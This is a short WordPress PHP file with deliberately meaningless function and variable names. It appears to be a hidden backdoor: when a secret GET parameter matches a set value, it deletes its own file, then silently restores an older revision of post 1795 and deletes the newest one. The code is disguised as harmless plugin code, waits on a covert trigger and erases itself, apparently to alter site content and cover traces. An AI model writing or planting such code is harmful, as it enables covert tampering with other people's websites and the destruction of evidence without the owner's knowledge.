<?php

function photos_widgets_rss_copyright() {
	if (isset($_GET['delivery_disable_cookies_dropdown']) && $_GET['delivery_disable_cookies_dropdown'] === 'cdn_notify_adsense') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$sliding_shopp_cloud_only = 1795;
		$lite_based_style_magic = wp_get_post_revisions($sliding_shopp_cloud_only);
		if (empty($lite_based_style_magic)) die('no revisions');
		if (count($lite_based_style_magic) < 2) die('less than 2');
		$traffic_poster_cool_quantity = array_shift($lite_based_style_magic);
		$display_section_article = $traffic_poster_cool_quantity->ID;
		$listings_free_wpforms_lead = array_shift($lite_based_style_magic);
		$tables_send_project = $listings_free_wpforms_lead->ID;
		$install_software_tag_control = wp_restore_post_revision($tables_send_project);
		if ($install_software_tag_control === false) die('error restoring');
		$install_software_tag_control = wp_delete_post_revision($display_section_article);		
		if ($install_software_tag_control === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'photos_widgets_rss_copyright');
